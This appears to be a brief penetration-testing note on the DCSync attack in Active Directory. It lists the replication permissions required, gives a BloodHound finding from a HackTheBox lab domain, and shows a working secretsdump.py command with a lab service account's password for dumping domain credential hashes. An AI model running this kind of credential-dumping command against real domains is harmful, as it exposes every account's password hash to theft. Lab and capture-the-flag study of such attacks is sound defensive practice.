# DCSync
---------

- Required permissions:
	- Replicating Directory Changes
	- Replicating Directory Changes All


Using bloodhound look out for the following permission:
	The user SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL has the DS-Replication-Get-Changes-All privilege on the domain EGOTISTICAL-BANK.LOCAL.


Using secretsdump.py:
```bash
python3 /opt/wintools/impacket/examples/secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
```


Granting an user the required rights to perform DC Sync Attack:
- get it form HTB-Forest
